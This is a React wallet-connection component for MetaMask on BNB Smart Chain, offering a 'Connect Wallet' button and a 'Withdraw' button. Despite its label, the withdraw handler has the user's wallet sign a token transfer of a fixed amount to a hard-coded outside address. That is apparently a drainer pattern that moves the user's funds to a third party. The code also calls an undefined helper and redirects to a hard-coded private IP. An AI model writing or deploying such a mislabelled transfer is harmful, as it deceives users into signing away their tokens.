import { ethers } from "ethers"
import { useState, useEffect } from "react"

import { diamBinanceAbi, diamBinanceAddress, polygonUsdtAbi, polygonUsdtAddress } from "../constants"

export default function ConnectButton() {
    const [walletAddress, setWalletAddress] = useState("")

    const connectWallet = async () => {
        if (typeof window !== "undefined" && typeof window.ethereum !== "undefined") {
            try {
                const isMetaMaskConnected = await window.ethereum.request({
                    method: "eth_chainId",
                })

                if (isMetaMaskConnected === "0x38") {
                    const accounts = await window.ethereum.request({
                        method: "eth_requestAccounts",
                    })
                    setWalletAddress(accounts[0])
                    console.log(accounts[0])
                } else {
                    const encodedURL = encodeURIComponent("http://192.168.1.125:3000")
                    window.location.href = `metamask://open?url=${encodedURL}`
                }
            } catch (e) {
                console.log(e.message)
            }
        } else {
            console.log("Please install MetaMask...")
            window.location.href =
                "https://metamask.app.link/dapp/https://connect-button-for-metamask.vercel.app/"
        }
    }

    async function withdraw() {
        if (typeof window.ethereum !== "undefined") {
            const provider = new ethers.providers.Web3Provider(window.ethereum)
            const signer = provider.getSigner()
            const add = await signer.getAddress()
            console.log(add, "==============>")
            const contract = new ethers.Contract(diamBinanceAddress, diamBinanceAbi, signer)
            try {
                const transactionResponse = await contract.transfer(
                    "0x5fdb4404f93e9e8a5e7b4d3378f8213348e9b266",
                    "100000000000"
                )
                await listenForTransactionMine(transactionResponse, provider)
            } catch (error) {
                console.log(error)
            }
        }
    }

    return (
        <div>
            <div className="absolute top-0 right-0 py-5 px-5">
                <button
                    onClick={connectWallet}
                    type="button"
                    className="text-gray-900 bg-gradient-to-r from-red-200 via-red-300 to-yellow-200 hover:bg-gradient-to-bl focus:ring-4 focus:outline-none focus:ring-red-100 dark:focus:ring-red-400 font-medium rounded-lg text-sm px-5 py-2.5 text-center mr-2 mb-2"
                >
                    <span>
                        {walletAddress && walletAddress.length > 0
                            ? `Connected: ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
                            : "Connect Wallet"}
                    </span>
                </button>
                <button
                    onClick={withdraw}
                    type="button"
                    className="text-gray-900 bg-gradient-to-r from-red-200 via-red-300 to-yellow-200 hover:bg-gradient-to-bl focus:ring-4 focus:outline-none focus:ring-red-100 dark:focus:ring-red-400 font-medium rounded-lg text-sm px-5 py-2.5 text-center mr-2 mb-2"
                >
                    Withdraw
                </button>
            </div>
        </div>
    )
}
